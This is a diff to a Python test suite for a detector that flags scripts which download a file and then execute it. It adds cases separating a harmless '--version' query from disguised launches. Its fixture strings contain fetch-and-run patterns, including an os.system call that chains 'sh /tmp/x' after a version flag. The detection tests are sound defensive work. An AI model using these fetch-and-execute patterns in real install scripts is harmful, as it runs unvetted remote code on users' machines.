@@ -106,6 +106,52 @@ class TestNotThis:
         source = f"import requests\nexec('X = 1')\nLATEST = requests.get('{URL}').json()\n"
         assert FetchRunKit.details(source) == []
 
+    def test_a_fetch_beside_a_tool_asked_for_its_version(self) -> None:
+        # A compiler asked for its version while a header is downloaded: a query, not a launch.
+        source = (
+            "import os, subprocess, urllib.request\n"
+            "cc = os.environ.get('CC', 'cc')\n"
+            "out = subprocess.run([cc, '--version'], capture_output=True, text=True)\n"
+            f"urllib.request.urlretrieve('{URL}', 'include/x.h')\n"
+        )
+        assert FetchRunKit.details(source) == []
+
+
+class TestAVersionFlagDoesNotHideALaunch:
+    def test_the_fetched_file_started_with_a_version_flag(self) -> None:
+        source = (
+            "import subprocess, urllib.request\n"
+            "path = '/tmp/x'\n"
+            f"urllib.request.urlretrieve('{URL}', path)\n"
+            "subprocess.run([path, '--version'])\n"
+        )
+        assert FetchRunKit.details(source) == [FetchRunKit.DETAIL]
+
+    def test_the_fetched_path_named_literally_with_a_version_flag(self) -> None:
+        source = (
+            "import subprocess, urllib.request\n"
+            f"urllib.request.urlretrieve('{URL}', '/tmp/x')\n"
+            "subprocess.run(['/tmp/x', '-V'])\n"
+        )
+        assert FetchRunKit.details(source) == [FetchRunKit.DETAIL]
+
+    def test_a_version_flag_in_a_shell_string_still_runs(self) -> None:
+        # A shell string can chain anything after the flag; only an argument list is read as a query.
+        source = (
+            "import os, urllib.request\n"
+            f"urllib.request.urlretrieve('{URL}', '/tmp/x')\n"
+            "os.system('cc --version; sh /tmp/x')\n"
+        )
+        assert FetchRunKit.details(source) == [FetchRunKit.DETAIL]
+
+    def test_a_version_flag_beside_other_arguments_still_runs(self) -> None:
+        source = (
+            "import subprocess, requests\n"
+            f"requests.get('{URL}')\n"
+            "subprocess.run(['tool', '--version', '--install'])\n"
+        )
+        assert FetchRunKit.details(source) == [FetchRunKit.DETAIL]
+
 
 class TestTheRule:
     def test_importing_the_package_blocks(self, tmp_path: Path) -> None:
@@ -151,6 +197,24 @@ class TestTheInstallForm:
             "import subprocess\n"
             "from setuptools import setup\n"
             "rev = subprocess.check_output(['git', 'describe']).decode()\n"
+            "setup(name='demo', version='1.0')\n"
+        )
+        assert self.INSTALL_RULE not in self.rules(tmp_path, setup)
+
+    def test_a_setup_script_that_downloads_a_header_and_checks_the_compiler_is_not_this(
+        self, tmp_path: Path
+    ) -> None:
+        setup = (
+            "import os, subprocess, sys, urllib.request\n"
+            "from setuptools import setup\n"
+            "def _check_compiler():\n"
+            "    cc = os.environ.get('CC', 'cc')\n"
+            "    r = subprocess.run([cc, '--version'], capture_output=True, text=True, check=False)\n"
+            "    if r.returncode:\n"
+            "        sys.exit('no compiler')\n"
+            "_check_compiler()\n"
+            "os.makedirs('include', exist_ok=True)\n"
+            f"urllib.request.urlretrieve('{URL}', os.path.join('include', 'x.h'))\n"
             "setup(name='demo', version='1.0')\n"
         )
         assert self.INSTALL_RULE not in self.rules(tmp_path, setup)
